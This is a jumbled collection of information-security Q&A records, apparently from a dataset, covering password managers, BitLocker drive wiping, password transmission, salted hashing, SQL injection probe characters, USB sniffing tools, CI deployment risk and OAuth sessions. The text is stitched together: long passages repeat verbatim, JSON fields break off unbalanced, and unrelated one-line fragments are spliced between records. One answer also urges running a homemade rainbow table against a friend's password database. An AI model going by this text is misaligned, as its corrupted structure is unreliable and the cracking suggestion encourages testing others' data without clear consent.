The short one goes something like this:\nMost of the exposures (of usernames and passwords) we see are not targeted attacks against an individual, but they can result in an individual's credentials being exposed. A password manager helps to limit the impact on a single user by allowing them to use different passwords across all websites they access, while minimising the risk that they will forget them.\nFrom my experience, people who oppose the use of a password manager are afraid of a targeted attack against themselves, rather than the opportunistic attacks I described - but they are correct: if someone gets access to their password repository, it's game over.\nNow, there's a \"right\" and a \"wrong\" way to use password managers. Here are some tips:\n\nMake sure you do your research before choosing which password manager you want to use: you want to ensure that you know where your data is being stored and how it is being encrypted. You also want to make sure you're using a reputable product.\nMake sure your master password is sufficently complex. Whether you choose to use a secure passphrase or a complex password, you want to make sure it is strong enough to protect your database. If somebody guesses your password (or manages to crack it), all of your passwords are exposed.\nNever access your password database from a public computer. And, if you have to, change your master password (from a private computer) afterwards. Public computers may have keyloggers, and all kinds of other fun things which may expose your master password. Even worse, if your database is an offline database (e.g. KeePass) you're not actually deleting it from the disk when you send it to the recycle bin.\nMake sure that your private computer has adequate anti-virus/malware protection. Same logic as number three: you don't want to give people access to your master password under any circumstances.\nUse multi-step authentication whenever possible. Most popular email providers offer this now, and it's a great way to minimise the likelihood of your account being accessed, even if someone does discover your 128 character password.\n\nLastly, my personal preference is to avoid any \"public\" online password managers (e.g. LastPass). I don't mind password databases being online (e.g. putting your KeePass database in Dropbox - not that I do this), because this would take a targeted attack for somebody to find your passwords. But, I'm sure attackers would love to get their hands on the database of one of these service providers - for no other reason than to say that they did. From there, is just a matter of an opportunistic individual getting lucky, and all your passwords become theirs.",

Even worse, if your database is an offline database (e.g. KeePass) you're not actually deleting it from the disk when you send it to the recycle bin.\nMake sure that your private computer has adequate anti-virus/malware protection. Same logic as number three: you don't want to give people access to your master password under any circumstances.\nUse multi-step authentication whenever possible. Most popular email providers offer this now, and it's a great way to minimise the likelihood of your account being accessed, even if someone does discover your 128 character password.\n\nLastly, my personal preference is to avoid any \"public\" online password managers (e.g. LastPass). I don't mind password databases being online (e.g. putting your KeePass database in Dropbox - not that I do this), because this would take a targeted attack for somebody to find your passwords. But, I'm sure attackers would love to get their hands on the database of one of these service providers - for no other reason than to say that they did. From there, is just a matter of an opportunistic individual getting lucky, and all your passwords become theirs."

As a result I got unrecognizable base64 which looks like random key. Then after that I did reverse in the flash player. and as a result I got player working pretty good.

Then the hard drive is formatted and Windows is completely reinstalled. Is it still possible to recover the previously encrypted data now?",
    "context": "",
    "output": "The data on a BitLocker encrypted drive is not encrypted with the key in the TPM. Instead, the key in the TPM unlocks the volume header, which contains the bulk encryption key. This is a common construction in full-disk encryption (FDE) schemes. If the BitLocker volume header has been erased from the disk, the key used to encrypt/decrypt the bulk data has been destroyed, so the data is completely unrecoverable.\nWhether or not the volume header was wiped from the disk depends on the type of disk and what type of format you did.\nIf the disk is a modern SSD (i.e. not one of the first generations from the early 2000s) it will support Secure Erase and TRIM, which Windows will have used. You can usually tell because the format operation takes only a few seconds instead of tens of minutes or a few hours. The data written to the flash on the SSD is transparently encrypted during normal operation. The erase command simply throws away the key and mapping table, then generates a new key. Since the old key is gone, the data on the disk is rendered unreadable. This is helpful since SSDs are prone to write wear, so overwriting all the flash cells reduces their operating lifetime. In addition, SSDs use overprovisioning (i.e. more flash cells than the advertised capacity) to help aid with wear-levelling, so if the OS tries to just overwrite the logical blocks it can see, it won't actually clear the data on those extra cells. In short: if it's an SSD, the format will have wiped the volume header.\nIf the disk is a mechanical hard disk, a quick format may not have removed the volume header. A quick format on a hard disk works by just writing a new filesystem header and table to the start of the disk, without actually erasing any data. The first sector(s) of the disk will likely have been overwritten by the new filesystem, but (if I recall correctly) the BitLocker volume header is also backup up in another sector later in the disk, in case the primary header becomes corrupted. As such, a quick format might not do it. In this case you'd want to have performed a \"normal\" format, which writes zeroes to the disk. This is sufficient - you don't need any fancy multi-pass stuff. That said, if you enabled BitLocker again after re-installing, it almost certainly overwrote the original volume headers.\nSomething you may wish to do is clear the TPM. This removes all keys that have been stored in the TPM and resets it to a fresh state. If you have enabled BitLocker on the new OS install, clearing the TPM will render the data unreadable and you'll have to do another re-install.",

      "question": "Is it safe to give away a computer with a hard drive previously encrypted with BitLocker?\nAssuming the hard drive is encrypted with BitLocker and it is on a laptop with a TPM module. Then the hard drive is formatted and Windows is completely reinstalled. Is it still possible to recover the previously encrypted data now?",
      "answer": "The data on a BitLocker encrypted drive is not encrypted with the key in the TPM. Instead, the key in the TPM unlocks the volume header, which contains the bulk encryption key. This is a common construction in full-disk encryption (FDE) schemes. If the BitLocker volume header has been erased from the disk, the key used to encrypt/decrypt the bulk data has been destroyed, so the data is completely unrecoverable.\nWhether or not the volume header was wiped from the disk depends on the type of disk and what type of format you did.\nIf the disk is a modern SSD (i.e. not one of the first generations from the early 2000s) it will support Secure Erase and TRIM, which Windows will have used. You can usually tell because the format operation takes only a few seconds instead of tens of minutes or a few hours. The data written to the flash on the SSD is transparently encrypted during normal operation. The erase command simply throws away the key and mapping table, then generates a new key. Since the old key is gone, the data on the disk is rendered unreadable. This is helpful since SSDs are prone to write wear, so overwriting all the flash cells reduces their operating lifetime. In addition, SSDs use overprovisioning (i.e. more flash cells than the advertised capacity) to help aid with wear-levelling, so if the OS tries to just overwrite the logical blocks it can see, it won't actually clear the data on those extra cells. In short: if it's an SSD, the format will have wiped the volume header.\nIf the disk is a mechanical hard disk, a quick format may not have removed the volume header. A quick format on a hard disk works by just writing a new filesystem header and table to the start of the disk, without actually erasing any data. The first sector(s) of the disk will likely have been overwritten by the new filesystem, but (if I recall correctly) the BitLocker volume header is also backup up in another sector later in the disk, in case the primary header becomes corrupted. As such, a quick format might not do it. In this case you'd want to have performed a \"normal\" format, which writes zeroes to the disk. This is sufficient - you don't need any fancy multi-pass stuff. That said, if you enabled BitLocker again after re-installing, it almost certainly overwrote the original volume headers.\nSomething you may wish to do is clear the TPM. This removes all keys that have been stored in the TPM and resets it to a fresh state. If you have enabled BitLocker on the new OS install, clearing the TPM will render the data unreadable and you'll have to do another re-install."

      "answer": "First and most important advice I can give you is to not debug on your host machine, use a virtual machine such as hyper-v, VMWare and virtualbox instead. \nSecond, your preferred tool is WinDbg. There are many tutorials for setting it up with virtual machines. You can start from MSDN.\nIf you want to learn more how \"heap management works\" fast and in great details, you should consider reading the book What Makes It Page by Enrico Martignetti."

      "answer": "No, nowadays zip files are protected by AES. This will hide all of the plaintext in a way that you can only recover it when you have the key. The only other thing you can see is the size of the plaintext as that is as good as identical to the size of the ciphertext.\nHexadecimals are just a readable representation of the bytes that make up the ciphertext. However, as the ciphertext will consist of byte values indistinguishable from random, that will not help you one iota."

      "question": "My friend hashes passwords with SHA512 algorithm without salt. How do I convince him that he needs to add salt?\nToday I discovered something incredibly stupid - my friend hashes user passwords with sha512 algorithm without a salt. I immediately raised this issue to him but he said he wants to see anyone crack a single password in his database. I told him that without a hash his database is vulnerable to rainbow attack but he said no one had this large rainbow table for sha512 as each has is 64 hex characters long.\nHow do I convince him that he still needs to add salt? Does anyone know what the hash cracking rate of sha512 is? I could argue then that it would take this much or that much time to crack all 8 char passwords, etc.",
      "answer": "How about you take his challenge? Go make a quick rainbow table of common passwords and run it over his database.  You're bound to hit something (especially if he doesn't have a password policy).  However, this may not work if he has a small database."

If someone is sniffing, they will capture both and if the inbox is compromised, they will capture both. But apparently, it's \"best practice\" to send it separately.\nNow personally, I would send a password via other means, such as a phone call. What would you guys recommend?",
    "context": "",
    "output": "It certainly doesn't hurt your security to send two separate emails, but I agree that it's not a silver bullet.\nThe better practice is to send the password \"out of band\", meaning that you send the file and the password by different communication channels; one on the internet, and one not. If you send the file by email, send the password by SMS, if the file is on a network share, write the password on paper and physically give it to them, etc.\nTo understand why people make these suggestions, we need to think about which threat model this practice is trying to protect us from. In this case, both the sender and the recipient have both pieces, so it's not protecting us from end-point compromise (like someone having access to your computer or email account), instead it is protecting us from a malicious mail-man while the data's in transit. The idea is to break the data into crypto-pieces and send each piece by a different channel so that no one mail-man has enough to reconstruct the data.\nWith this threat model, even sending two separate emails with the same To: and From: addresses does some good when you consider that 1) email is a plaintext protocol, and 2) any two packets will take two very different paths through the internet. This way, any 3rd-party router in the middle can see the contents of the message, but is only likely to see half the crypto-data. It certainly won't stop your ISP, or the NSA, (who log everything) from putting both bits back together, but they have to sift through a monumental amount of data to do it, which is expensive for them.\nClearly, sending both chunks with completely different To: and From: addresses, or delivering one piece by a non-internet method makes the reconstruction that much harder. You don't have to make reconstruction impossible, you just have to make it more effort than breaking into your computer so that it's no longer the weak-point in the chain.",

      "question": "Is it good practice to send passwords in separate emails, and why?\nI have heard from different people and in different places that if I send an encrypted file to someone else, I should send them the password in a separate email; but why? If someone is sniffing, they will capture both and if the inbox is compromised, they will capture both. But apparently, it's \"best practice\" to send it separately.\nNow personally, I would send a password via other means, such as a phone call. What would you guys recommend?",
      "answer": "It certainly doesn't hurt your security to send two separate emails, but I agree that it's not a silver bullet.\nThe better practice is to send the password \"out of band\", meaning that you send the file and the password by different communication channels; one on the internet, and one not. If you send the file by email, send the password by SMS, if the file is on a network share, write the password on paper and physically give it to them, etc.\nTo understand why people make these suggestions, we need to think about which threat model this practice is trying to protect us from. In this case, both the sender and the recipient have both pieces, so it's not protecting us from end-point compromise (like someone having access to your computer or email account), instead it is protecting us from a malicious mail-man while the data's in transit. The idea is to break the data into crypto-pieces and send each piece by a different channel so that no one mail-man has enough to reconstruct the data.\nWith this threat model, even sending two separate emails with the same To: and From: addresses does some good when you consider that 1) email is a plaintext protocol, and 2) any two packets will take two very different paths through the internet. This way, any 3rd-party router in the middle can see the contents of the message, but is only likely to see half the crypto-data. It certainly won't stop your ISP, or the NSA, (who log everything) from putting both bits back together, but they have to sift through a monumental amount of data to do it, which is expensive for them.\nClearly, sending both chunks with completely different To: and From: addresses, or delivering one piece by a non-internet method makes the reconstruction that much harder. You don't have to make reconstruction impossible, you just have to make it more effort than breaking into your computer so that it's no longer the weak-point in the chain."

PGP is widely used for signing, encrypting and decrypting electronic data to maximize the security issues of data exchange. The protocol S/MIME refers to Secure/Multipurpose Internet Mail Extensions.

Roughly speaking, if the client wants at least min bits, at most max bits, and preferably n bits, then the server will choose among the moduli in the min..max range; it will try to get the smallest modulus which exceeds n, and, if there is none, the biggest modulus it has (still in the min..max range, of course). If the server finds several modulus of the same \"optimal\" length, then it selects one randomly. If the server knows of no modulus in the min..max range, then connection fails.\nThe default /etc/ssh/moduli, at least on my server, appears to have moduli of size 1023 to 8191 bits."

Usually it'll miss any arguments after the second one.\nIs there any way to tell HexRays more about this routine, so that it \"does the right thing\" and displays the data correctly?

      "question": "Why do testers often use the single quote ( ' ) to test for SQL injection?\nIt has been seen that security testers input either ' or ; into the application entry points to test for SQL injection. Why are these characters used?",
      "answer": "The character ' is used because this is the character limiter in SQL. With ' you delimit strings and therefore you can test whether the strings are properly escaped in the targeted application or not. If they are not escaped directly you can end any string supplied to the application and add other SQL code after that.\nThe character ; is used to terminate SQL statements. If you can send the character ; to an application and it is not escaped outside a string (see above) then you can terminate any SQL statement and create a new one which leaves a security breach."

      "question": "USB Dongle Traffic Monitoring\nHow can I monitor a usb dongle's traffic? I would like to see how a program and its usb dongle talk to each other, if it is possible replay this traffic?\nSince I am new to this type of thing, any tutorial or tool suggestion is welcome.",
      "answer": "It depends on what your budget is like. The best USB analyzers are hardware devices with good protocol dissectors. If you have a huge budget you can go with the various solutions from LeCroy such as the LeCroy Voyager M3i. If you have a decent size budget and you only need USB 2.0, I would go for the Ellisys USB Explorer 200. If you want to replay and change packets you can take a look at the Ellisys USB Explorer 260 as I don't think the 200 is capable of replay. If you need USB 3.0 I would go with the Ellisys USB Explorer 280. On the budget hardware side you have the Beagle 480 and even more budget the Beagle 12.\nIf you're on a budget you can go with a software solution such as USBSpy, USBLyzer, BusTrace or USBSnoop. \nThere's also the more DIY solution which involves running the process you want to monitor in a virtual machine such as VirtualBox and then routing the traffic which goes through the USB ports to your own dissector. You can use Wireshark as a dissector for VM USB traffic.\nPersonally I would go with the Ellisys Explorer 200 or 260. Either one presents a good compromise between price and quality depending on your needs."

Every time we push code to our central Git repository production branch, the CI services is notified and fetches the code to run the test suite.\nThe CI service allows us to write a post build script which can automatically push the code to our Heroku production server when the tests pass.\nHowever we fear that if an attacker breaks into the CI service, he can then push any code change he wants to our production server.\nWe plan to change this architecture to have the CI service ping a specific 'deploy' server of ours when the tests pass. This 'deploy' server would fetch the latest production branch code from our central Git repository and the push to our Heroku production server.\nThis way, if the CI service is compromised, an attacker could not push from the CI service any code he wants to our production server. He would have to break into our 'deploy' server.\nThe goal of this new architecture is to move the risk from the CI SaaS to a server of ours. The Heroku credentials necessary to deploy are no more hosted on the CI SaaS but on a server of ours.\nDoes it make sense?

      "question": "How to mitigate the risk of a continuous integration service security breach?\nWe are using a Continuous Integration service to automatically run our product test suite. Every time we push code to our central Git repository production branch, the CI services is notified and fetches the code to run the test suite.\nThe CI service allows us to write a post build script which can automatically push the code to our Heroku production server when the tests pass.\nHowever we fear that if an attacker breaks into the CI service, he can then push any code change he wants to our production server.\nWe plan to change this architecture to have the CI service ping a specific 'deploy' server of ours when the tests pass. This 'deploy' server would fetch the latest production branch code from our central Git repository and the push to our Heroku production server.\nThis way, if the CI service is compromised, an attacker could not push from the CI service any code he wants to our production server. He would have to break into our 'deploy' server.\nThe goal of this new architecture is to move the risk from the CI SaaS to a server of ours. The Heroku credentials necessary to deploy are no more hosted on the CI SaaS but on a server of ours.\nDoes it make sense?

      "question": "Why did hosts get infected if the endpoint protection product has a signature for that malware?\nMultiple hosts were attempting CNC communication that is specific to a threat from at least 2013, H-worm.\nHowever, endpoint protection is deployed on these hosts and functioning but no malicious files were recently detected. The endpoint protection product is even specified in the malware's CNC. But this threat is very old and my vendor seems to have signatures for it. I queried some file hashes (from the FireEye article I linked above) in VirusTotal to see if my vendor detects them and it does. Scheduled antivirus scans were also running as they should but nothing was detected. \nMy main question is, why did the endpoint protection miss these infections?\nRight now I have 3 guesses:\n\nA product malfunction has taken place and I need to contact my vendor;\nThere exist (new?) instances of H-worm that are not detected by my vendor\nThese infections are not reflected in endpoint protection logs for some legitimate reason",
      "answer": "Anti-malware software can have exclusions of files with certain extensions or exclude certain drives or directories from scanning. If the malware is located in a location excluded for scanning, the software will not identify, quarantine or remove the offending software.\nYou can have a look through the software configuration for such exclusions. If you know where the worm is located, you could run a parallel test by placing the eicar test file in that folder and see if that is identified. If the software is scanning the infected location and is not finding the worm or eicar, the software is not fit for purpose."

      "question": "Is HostGator storing my password in plaintext?\nI want to bring this up to HostGator, but want to verify my suspicions before making a big fuss.\nI asked a customer care representative to help me add an SSL certificate to a site I host with them. When he was done, I received this e-mail with all my login information, and my entire password in plain text (I left the first letter visible as evidence). I set up this password over a year ago, and it was a big surprise to find out they sent it back to me, unprompted, in plaintext:\n\nI immediately brought this up to the representative, who repeatedly tried to convince me that it was OK. I decided to drop it after a few minutes, because I think I should bring it up to someone higher up. Before I do so, is it safe to assume that my password is stored in their database as plain text? If so, do you have any suggestions on how to address this issue with the provider?",
      "answer": "Yes, they store passwords in plaintext or equivalent, and definitely transmit them in plain text. This was discovered in 2011.\nThis is confirmed HostGator being listed on Plaintext Offenders, as well as by its entry in the CVS file containing a list of offenders.

      "question": "Is it recommended to send an authentication request to the Resource Owner (by the Authorization Server) if it already has an active session?\nIn OAuth 2.0 Authorization Code Flow (Grant Type), is it recommended (or is it maybe even a best practice) to send an authentication request (e.g. a login-request form) to the Resource Owner (by the Authorization Server), even if the Resource Owner has already an active session on the Authorization Server, when obtaining an Authorization Code for the first time for a certain Client? \nIn other words, is it recommended to kill/destroy a currently active session first, if there's one? Or is it not important at all?",
      "answer": "Actually you won't know from the client side whether the resource owner has an active web session on the authorization server or not, and it's not the client's matter.\nThat's however up to the authorization to decide what to do, for instance:\n\nAuthenticate if the resource owner is not logged in\nGrant immediate access without logging in again if the resource owner has already logged in, or reauthenticate him (for instance if he logged in more than 7 days ago) by killing or updating the session. Reauthentication can also consist in requiring a second factor (SMS OTP...)\nMake the resource owner authorize some scopes he has not approved yet\nOr even ask him to approve new CGUs\nEtc\n\nIn a nutshell, it's the authorization server's matter to decide what to do (i.e. applying an authentication and authorization policy), not the client's.\nIf the resource owner is already logged in, has approved the requested scope, etc. then the server will redirect to the client directly with an authorization code. In this case a blank page will shortly appear, the URL will change swiftly (redirects) before the resource owner is redirected to the client. This is how SSO (Single Sign-On) works."
